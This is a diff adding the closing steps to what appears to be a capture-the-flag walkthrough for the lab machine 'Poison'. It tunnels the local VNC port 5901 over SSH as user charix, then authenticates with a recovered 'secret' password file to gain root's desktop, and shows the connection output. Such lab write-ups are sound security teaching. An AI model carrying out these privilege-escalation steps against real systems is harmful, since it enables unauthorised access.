@@ -490,7 +490,7 @@ root   529   0.0  0.9  23620  8868 v0- I    11:51    0:00.02 Xvnc :1 -desktop X 
 
 <br />
 
-Let's break down the flags used in the `vnc` process: 
+Let's break down the flags used in the `VNC` process: 
 
 - `:1`: Specifies the display number (DISPLAY=:1).
 
@@ -505,5 +505,75 @@ Let's break down the flags used in the `vnc` process:
 - `depth 24`: Sets the color depth to 24 bits.
 
 - `rfbwait`: Sets the time (in miliseconds) that the server waits for a client connection before timing out.
+
+<br />
+
+### vncviewer 
+
+<br />
+
+There is a tool called `vncviewer` that allows us to connect to a `VNC` server as a client.
+
+To install it, we can run the following command:
+
+<br />
+
+```bash
+apt install xtightvncviewer
+```
+
+<br />
+
+### SSH Tunneling
+
+<br />
+
+Before establishing a connection, we should set up a port forwarding.
+
+This way, we can access the `5901` VNC port from our attacking machine:
+
+<br />
+
+```bash
+❯ ssh charix@10.10.10.84 -L 5901:127.0.0.1:5901
+```
+
+<br />
+
+Finally, we can connect to the service using `vcnviewer`, providing the `secret` binary file for authentication:
+
+<br />
+
+```bash
+❯ vncviewer -passwd secret localhost:5901
+Connected to RFB server, using protocol version 3.8
+Enabling TightVNC protocol extensions
+Performing standard VNC authentication
+Authentication successful
+Desktop name "root's X desktop (Poison:1)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Same machine: preferring raw encoding
+```
+
+<br />
+
+![11](../../../assets/images/Poison/11.png)
+
+<br />
+
+Root access obtained!
+
+I really enjoyed this one. It's a great machine for learning how to exploit log poisoning. A vulnerability that demonstrates how critical a simple Local File Inclusion can become.
+
+Hope you learned something and ejoyed the walkthrough.
+
+Keep Hacking!❤️
 
 <br />
